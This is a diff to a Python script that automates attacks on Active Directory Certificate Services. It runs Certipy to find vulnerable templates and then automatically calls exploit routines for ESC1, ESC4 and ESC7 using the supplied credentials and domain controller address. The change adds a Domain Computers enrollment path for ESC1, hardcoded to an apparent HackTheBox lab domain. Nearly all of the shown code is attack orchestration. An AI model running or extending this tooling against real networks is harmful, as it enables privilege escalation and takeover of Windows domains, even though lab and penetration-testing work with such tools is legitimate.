@@ -1,4 +1,4 @@
-from utils.certipy_runner import run_certipy_find, save_results_to_json, exploit_esc1, exploit_esc4, exploit_esc7
+from utils.certipy_runner import run_certipy_find, save_results_to_json, exploit_esc1, exploit_esc4, exploit_esc7, exploit_esc1_domain_computer
 from utils.parser import parse_stdout_output
 import argparse
 import os
@@ -23,9 +23,26 @@ def main():
     parsed_data = parse_stdout_output(output)
     save_results_to_json(parsed_data, "output/certipy-find-output.json")
 
-    for template in parsed_data:
-        if template.get("vuln") == "ESC1":
-            print(f"[+] Detected ESC1 on template: {template['template_name']}")
+    # Check for ESC1 first (higher priority)
+    esc1_templates = [t for t in parsed_data if t.get("vuln") == "ESC1"]
+    esc4_templates = [t for t in parsed_data if t.get("vuln") == "ESC4"]
+    esc7_cas = [t for t in parsed_data if t.get("vuln") == "ESC7"]
+
+    if esc1_templates:
+        template = esc1_templates[0]
+        print(f"[+] Detected ESC1 on template: {template['template_name']}")
+        # Check if template allows Domain Computers enrollment
+        if "AUTHORITY.HTB\\Domain Computers" in output:
+            print("[+] Template allows Domain Computers enrollment - using computer account method")
+            exploit_esc1_domain_computer(
+                username=args.username,
+                password=args.password,
+                domain=args.domain,
+                dc_ip=args.dc_ip,
+                ca_name=template["ca_name"],
+                template_name=template["template_name"]
+            )
+        else:
             exploit_esc1(
                 username=args.username,
                 password=args.password,
@@ -34,29 +51,27 @@ def main():
                 ca_name=template["ca_name"],
                 template_name=template["template_name"]
             )
-            break
-        elif template.get("vuln") == "ESC4":
-            print(f"[+] Detected ESC4 on template: {template['template_name']}")
-            exploit_esc4(
-                username=args.username,
-                password=args.password,
-                domain=args.domain,
-                dc_ip=args.dc_ip,
-                ca_name=template["ca_name"],
-                template_name=template["template_name"]
-            )
-            break
-        elif template.get("vuln") == "ESC7":
-            print(f"[+] Detected ESC7 on template: {template['template_name']}")
-            exploit_esc7(
-                username=args.username,
-                password=args.password,
-                domain=args.domain,
-                dc_ip=args.dc_ip,
-                ca_name=template["ca_name"]
-            )
-            break
-
+    elif esc4_templates:
+        template = esc4_templates[0]
+        print(f"[+] Detected ESC4 on template: {template['template_name']}")
+        exploit_esc4(
+            username=args.username,
+            password=args.password,
+            domain=args.domain,
+            dc_ip=args.dc_ip,
+            ca_name=template["ca_name"],
+            template_name=template["template_name"]
+        )
+    elif esc7_cas:
+        ca = esc7_cas[0]
+        print(f"[+] Detected ESC7 on CA: {ca['ca_name']}")
+        exploit_esc7(
+            username=args.username,
+            password=args.password,
+            domain=args.domain,
+            dc_ip=args.dc_ip,
+            ca_name=ca["ca_name"]
+        )
     else:
         print("[!] No exploitable templates (ESC1 or ESC4 or ESC7) found.")
 
